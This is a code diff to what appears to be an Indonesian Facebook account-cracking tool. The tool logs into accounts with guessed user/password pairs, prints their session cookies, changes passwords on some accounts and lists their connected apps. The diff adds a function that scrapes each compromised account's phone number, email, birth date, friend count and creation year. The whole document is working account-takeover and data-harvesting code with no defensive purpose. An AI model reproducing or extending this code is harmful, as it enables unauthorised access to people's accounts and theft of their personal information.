@@ -87,6 +87,7 @@ class Eksekusi(Main):
 				if self.satua==True:
 					print(f"\r{H}[OK] {self.user}|{self.pw}|{coki}{P}        ",end="")
 				print(f"\r{H}[√] Akun Aman{P}\n[{K}={P}] Cookie: {BM}{coki}{P}\n",end="")
+				self.get_info(session,coki)
 				self.cek_apk(session,coki)
 		elif "checkpoint" in session.cookies.get_dict():
 			cp+=1
@@ -134,7 +135,7 @@ class Eksekusi(Main):
 					coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
 					if self.satua==True:
 						print(f"\r{H}[OK] {self.user}|{self.pw}|{coki}{P}        ",end="")
-					print(f"[{BM}+{P}] Apk yang terkait:")
+					self.get_info(session,coki)
 					self.cek_apk(session,coki)
 					
 		else:
@@ -158,8 +159,36 @@ class Eksekusi(Main):
 			an=session.post(self.url+link3.get("action"),data=dat2)
 			coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
 			print(f"\r[√] Akun tap yes -> password diubah!\n{H}[=] {self.user}|{''.join(pwBaru)}|{coki}{P}\n",end="")
-			self.cek_apk(session,coki)
-
+			if "checkpoint" not in coki:
+				self.get_info(session,coki)
+				self.cek_apk(session,coki)
+			else:
+				print("")
+	def get_info(self,session,coki):
+		response = session.get("https://mbasic.facebook.com/me/about",cookies={"cookie":coki}).text
+		response2 = session.get("https://mbasic.facebook.com/me/friends",cookies={"cookie":coki}).text
+		response3 = session.get("https://mbasic.facebook.com/me/allactivity/?entry_point=settings_yfi&settings_tracking=mbasic_footer_link%3Asettings_2_0&privacy_source=your_facebook_information&_rdr",cookies={"cookie":coki}).text
+		try:
+			tahun = re.findall('\<div\ class\=\".*?\"\ id\=\"year\_(.*?)\"\>',str(response3))[-1]
+		except:
+			print(response3)
+		try:
+			nomer = re.findall('\<span\>\<span\ dir\=\".*?\"\>(.*?)<\/span>',str(response))[0]
+		except:
+			print(response)
+		try:
+			email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
+		except:
+			print(response)
+		try:
+			ttl = re.findall('\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>',str(response))[0]
+		except:
+			print(response)
+		try:
+			teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
+		except:
+			print(response)
+		print(f"[{H}={P}] Tahun pembuatan: {K}{tahun}{P}\n[{H}={P}] Teman: {K}({teman}){P}\n[{H}={P}] Nomer-ponsel: {K}{nomer}{P}\n[{H}={P}] Email: {K}{email}{P}\n[{H}={P}] Tanggal-lahir: {K}{ttl}{P}")
 	def cek_apk(self,session,coki):
 		hit1, hit2 = 0,0
 		cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
@@ -190,3 +219,5 @@ class Eksekusi(Main):
 		else:
 			print(f"[{BM}×{P}] {M}Cookies Invalid{P}")
 		print("")
+		
+
